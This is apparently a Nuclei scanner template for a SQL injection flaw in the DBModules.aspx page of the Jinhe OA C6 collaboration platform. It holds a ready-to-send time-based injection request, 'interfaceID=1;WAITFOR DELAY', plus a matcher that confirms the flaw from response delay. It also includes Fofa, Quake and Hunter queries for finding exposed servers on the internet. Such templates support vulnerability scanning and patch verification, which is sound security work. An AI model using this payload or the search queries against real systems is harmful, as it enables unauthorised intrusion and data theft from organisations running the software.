id: JinheOA_C6_DBModules_SQLi

info:
  name: JinheOA_C6_DBModules_SQLi
  author: HK
  severity: high
  description: 金和OA-C6协同管理平台DBModules.aspx存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="c6/Jhsoft.Web.login"
    Quake-query: body="c6/Jhsoft.Web.login"
    Hunter-query: body="c6/Jhsoft.Web.login"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'